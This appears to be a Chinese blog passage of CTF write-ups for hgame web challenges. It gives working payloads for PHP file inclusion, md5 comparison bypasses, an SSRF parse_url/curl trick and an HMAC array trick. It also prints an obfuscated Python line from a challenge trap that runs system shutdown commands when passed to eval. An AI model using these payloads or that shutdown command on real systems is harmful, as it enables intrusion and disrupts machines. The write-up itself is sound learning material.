    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平台比赛在2月24号就结束了，只能复现一下，千言万语汇成一句话：爬虫题牛X！！！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><p>看见标题为<code>where is my robots</code>，访问<code>robots.txt</code>，发现一个访问路径<code>img/index.php</code>，访问到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>第一步也是看见了文件包含，又是<code>str_replace</code>，大概又是双写绕过，构造如下:</p><p><code>http://118.24.25.25:9999/easyphp/img/index.php?img=....//flag</code></p><p>没有得到flag，出来一句：<code>maybe_you_should_think_think</code>…想想也是，既然已经week2，肯定不会那么简单…由于通过 include_once 方式将文件执行，如果没有进行输出操作就无法显示出来；</p><p>第二步尝试使用php伪协议，构造如下：</p><p><code>http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag</code></p><p>得到base64编码：</p><p><code>PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK</code></p><p>解码即可：</p><p><img src="https://s2.ax1x.com/2019/02/19/kgWSjs.png" alt="kgWSjs.png"></p><h3 id="phptrick"><a href="#phptrick" class="headerlink" title="phptrick"></a>phptrick</h3><p>给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 admin.php 返回 “only localhost can see it”；那就11个判断，逐个击破：</p><p><strong>step1~2</strong></p><p>弱判断<strong>(!=)</strong>，使得str1和str2的md5值相等(==)，很简单，使用<code>str1=240610708&amp;str2=QNKCDZO</code>直接绕过；</p><p><strong>step3~4</strong></p><p>强判断<strong>(!==)</strong>，使得str3和str4的md5值相等(===)，直接数组绕过即可：<code>str3[]=a&amp;str4[]=b</code></p><p><strong>step5~8</strong></p><p>php 处理参数时会将参数名中的 “.” 替换为 “_”，所以即可构造<code>H.game</code>变量即可绕过step5；</p><p>构造数组绕过数字判断返回false，大小判断返回false，string以后产生Array，即可返回false：<code>H.game[]=1</code>；</p><p><strong>step9~11</strong></p><p>一开始没看懂，科普了一下大概是明白了，要求<code>PHP_URL_SCHEME</code>必须是<code>http</code>，<code>PHP_URL_HOST</code>必须是<code>www.baidu.com</code>，但是上述又必须localhost才可以访问，无从下手……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://www.runoob.com/"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概可以看懂，其实就是设置访问某个url资源，必须要成功访问，即可让<code>curl_exec</code>返回true，Google到一下资料学习到了：</p><blockquote><p>当url中有多个@符号时，<strong>parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的</strong>。因此当代码对<a href="mailto:`user@eval.com" target="_blank" rel="noopener">`user@eval.com</a>:<a href="mailto:80@baidu.com" target="_blank" rel="noopener">80@baidu.com</a>` 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过</p><p>source:<a href="https://xz.aliyun.com/t/2215" target="_blank" rel="noopener">https://xz.aliyun.com/t/2215</a></p></blockquote><p>即可构造如下：<code>url=http://@127.0.0.1:80@www.baidu.com/admin.php</code></p><p>得到admin.php的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为有<code>file_exists</code>，直接查看<code>flag.php</code>肯定是不行的，那就继续构造php伪协议绕过即可：</p><p><code>?filename=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>得到：</p><p><code>PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA/Pgo=</code></p><p>base64解码得flag：</p><p><img src="https://s2.ax1x.com/2019/02/19/kgoarQ.png" alt="kgoarQ.png"></p><h3 id="php-is-the-best-language"><a href="#php-is-the-best-language" class="headerlink" title="php is the best language"></a>php is the best language</h3><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);  <span class="comment">//传door[]置空secret</span></span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);         <span class="comment">//gate即可解出</span></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以发现关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);  <span class="comment">//传door[]置空secret</span></span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);         <span class="comment">//gate即可解出</span></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p><code>hash_hmac ( string $algo , string $data , string $key)</code>函数的data部分如果传入的为数组，则会返回<code>NULL</code>，所以即可将<code>$door</code>参数传入数组，即可得到可控的<code>$gate</code>，所以就直接可以绕过第二个if判断；</p></li><li><p>经过两次<code>md5</code>函数以后进行弱判断(==)，可以直接爆破：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">1</span>;$x&lt;<span class="number">100000000</span>;$x++)&#123;</span><br><span class="line"><span class="keyword">if</span> ((md5($x)+<span class="number">1</span>) == (md5(md5($x)))+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $x;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">12</span>[Finished in <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure></li><li><p>直接GET一个<code>$door</code>传一个数组，<code>$key=12</code>，可控的<code>$gate</code>为<code>key</code>的<code>sha256</code>值；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sec=<span class="keyword">NULL</span>;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>,<span class="string">'12'</span>,$sec);</span><br><span class="line"><span class="keyword">echo</span> $gate;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4217722</span>a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf[Finished in <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?door[]=1&amp;key=12&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure></li></ol><h3 id="BabySpider"><a href="#BabySpider" class="headerlink" title="BabySpider"></a>BabySpider</h3><p>这题考察python爬虫的编写能力，python渣渣写过点爬虫，正好拿来实战一下，不得不说这个题出的确实是好，也让我了解到了许多反爬的机制，下面就详细讲解一下做题的艰辛过程：</p><h4 id="1-10关"><a href="#1-10关" class="headerlink" title="1-10关"></a>1-10关</h4><p>其实就是简单的爬取页面，进行信息筛选，执行一下post回去即可，我当然会想的这么简单；</p><h4 id="11-20关"><a href="#11-20关" class="headerlink" title="11-20关"></a>11-20关</h4><p>然后就关机了…</p><p>一开始我以为是pycharm的锅，没想到第二次运行还是关机…瞬间爆炸（surprise mother f**ker）肯定是出题人调皮了…真的是秀（这反爬虫机制是真的骚~）</p><p>果然爬完第十关以后直接爬出11关的内容就要break观察一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> __g: [(os.system(<span class="string">'shutdown -s -t 0'</span>), (os.system(<span class="string">'shutdown now'</span>), <span class="keyword">None</span>)[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'os'</span>] <span class="keyword">in</span> [(__import__(<span class="string">'os'</span>, __g, __g))]][<span class="number">0</span>])(globals())<span class="comment">#-----=?</span></span><br></pre></td></tr></table></figure><p>大概是调用了一个os模块直接给我调用系统命令直接<code>shutdown</code>了，直接<code>eval()</code>肯定会关机；解决方法就是在http请求内容里加上UA头即可解决关机的困扰…</p><p>如果你认为这就结束了那就太天真了…加上以后继续报错…</p><p>不知道该肿么办啦…只好去看看官方wp，了解到了另一种反爬虫机制，具体解析如下：</p><p>打印好第11关的cookie，首先拿token登录，将页面的cookie修改为第11关的cookie，刷新页面：</p><p><a href="https://imgchr.com/i/k7yYhn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7yYhn.md.png" alt="k7yYhn.md.png"></a></p><p>发现网页显示的数字和要爬取的信息不一致（算式和之前的都不一样，答案还对个锤子？）：</p><p><img src="https://s2.ax1x.com/2019/02/28/k7y6hR.png" alt="k7y6hR.png"></p><p><img src="https://s2.ax1x.com/2019/02/28/k7yWjK.png" alt="k7yWjK.png"></p><p>继续在页面里搜索，发现style.css中的内容，原来是存在一个<code>Ariali.otf</code>文件：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">font-face</span> &#123;</span><br><span class="line">      <span class="attribute">font-family</span>: Ariali;</span><br><span class="line">      <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'/static/Ariali.otf'</span>);</span><br><span class="line">      <span class="attribute">font-weight</span>: normal;</span><br><span class="line">      <span class="attribute">font-style</span>: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看文件内容：</p><p><img src="https://s2.ax1x.com/2019/02/28/k7j3bF.png" alt="k7j3bF.png"></p><p>字体文件被动了手脚，数字的对应关系被打乱了，那么找到对应关系，将之前的公式恢复出来执行即可得到正确的答案；原来数字和替换后数字的对应关系如下，写个字典或者列表替换一下即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4 5 6 7 8 9 0</span><br><span class="line">| | | | | | | | | |</span><br><span class="line">0 2 6 9 4 3 5 8 7 1</span><br></pre></td></tr></table></figure><h4 id="21-30关"><a href="#21-30关" class="headerlink" title="21-30关"></a>21-30关</h4><p>到21关时候又报错了…打个CTF真辛苦啊…</p><p><img src="https://s2.ax1x.com/2019/02/28/kHAkr9.png" alt="kHAkr9.png"></p><p>再次使用第20关的cookie替换，查看到爬取到的表达式和页面上的又不一样…而且还不满足11-20关的替换关系，</p><p><a href="https://imgchr.com/i/kHApCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHApCT.md.png" alt="kHApCT.md.png"></a></p><p>再次查看源码，在css中的after元素中找到了真的表达式：</p><p><a href="https://imgchr.com/i/kHAe56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHAe56.md.png" alt="kHAe56.md.png"></a></p><p>手速比较快的话，还是可以看到的（和上面的cookie不一样，所以表达式不一样）：</p><p><a href="https://imgchr.com/i/kHATd1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHATd1.md.png" alt="kHATd1.md.png"></a></p><p>所以只要抓取css样式里的表达式即可：</p><p>解题脚本(python3)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">"http://111.231.140.29:10000/"</span></span><br><span class="line">url1=<span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url2=<span class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url3=<span class="string">"http://111.231.140.29:10000/statics/style.css"</span></span><br><span class="line">head=&#123;<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0"</span>&#125;</span><br><span class="line">token=&#123;<span class="string">"token"</span>:<span class="string">"phatlrSLFTDHSXiuD0wbG9DczhKcXRCm"</span>&#125;</span><br><span class="line">str1=[<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>]</span><br><span class="line">str2=[<span class="string">'0'</span>,<span class="string">'2'</span>,<span class="string">'6'</span>,<span class="string">'9'</span>,<span class="string">'4'</span>,<span class="string">'3'</span>,<span class="string">'5'</span>,<span class="string">'8'</span>,<span class="string">'7'</span>,<span class="string">'1'</span>]</span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=token)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line">session=r.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">        print(<span class="string">"*"</span>*<span class="number">20</span>+str(i+<span class="number">1</span>)+<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line">        num=re.findall(<span class="string">r'&lt;span&gt;(.*?)&lt;/span&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        res=eval(num[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">        print(num+<span class="string">"  "</span>+str(res))</span><br><span class="line">        answer=&#123;<span class="string">"answer"</span>:res&#125;</span><br><span class="line">        r=requests.post(url2,data=answer,cookies=session,headers=head)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        session=r.cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i&gt;<span class="number">9</span> <span class="keyword">and</span> i&lt;<span class="number">20</span>:</span><br><span class="line">        print(<span class="string">"*"</span> * <span class="number">20</span> + str(i + <span class="number">1</span>) + <span class="string">"*"</span> * <span class="number">20</span>)</span><br><span class="line">        num = re.findall(<span class="string">r'&lt;span&gt;(.*?)&lt;/span&gt;'</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">        num1=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">                subscript = str1.index(i)</span><br><span class="line">                num1 += str2[subscript]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num1 += i</span><br><span class="line">        res = eval(num1[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">        print(num1 + <span class="string">"  "</span> + str(res))</span><br><span class="line">        answer = &#123;<span class="string">"answer"</span>: res&#125;</span><br><span class="line">        r = requests.post(url2, data=answer, cookies=session, headers=head)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        session = r.cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i&gt;<span class="number">19</span>:</span><br><span class="line">        print(<span class="string">"*"</span>*<span class="number">20</span>+str(i+<span class="number">1</span>)+<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line">        response=requests.get(url3,cookies=session,headers=head)</span><br><span class="line">        response.encoding=response.apparent_encoding</span><br><span class="line">        num=re.findall(<span class="string">r'content:"(.*?)='</span>,response.text)[<span class="number">0</span>]</span><br><span class="line">        res=eval(num)</span><br><span class="line">        print(num+<span class="string">"  "</span>+str(res))</span><br><span class="line">        answer=&#123;<span class="string">"answer"</span>:res&#125;</span><br><span class="line">        r=requests.post(url2,data=answer,cookies=session,headers=head)</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        session=r.cookies</span><br><span class="line"><span class="keyword">if</span> <span class="string">"hgame"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><a href="https://imgchr.com/i/kHVkA1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHVkA1.md.png" alt="kHVkA1.md.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;9242455136c7afcc0d75204281e558ab63ac9a841e514a37e6702f15f21f3e01&#125;</span><br></pre></td></tr></table></figure><p><strong>这题出的真的是好，花了很长时间才解出来，归纳一下：</strong></p><ol><li><p><strong>还是不要只刷CTF题忘记原理的理解，类似于UA头，referer，此类的反爬虫措施还是很常见的，还有就是实际爬虫不注意说不定会被反日…</strong></p></li><li><p><strong>两个trick分别是对应了猫眼电影和汽车之家的前端反爬机制，利用视觉差异来欺骗爬虫而不影响正常的用户，如果不加注意，那么爬到的数据有可能就是一堆毫无作用的数据；</strong></p></li></ol><h3 id="Math有趣"><a href="#Math有趣" class="headerlink" 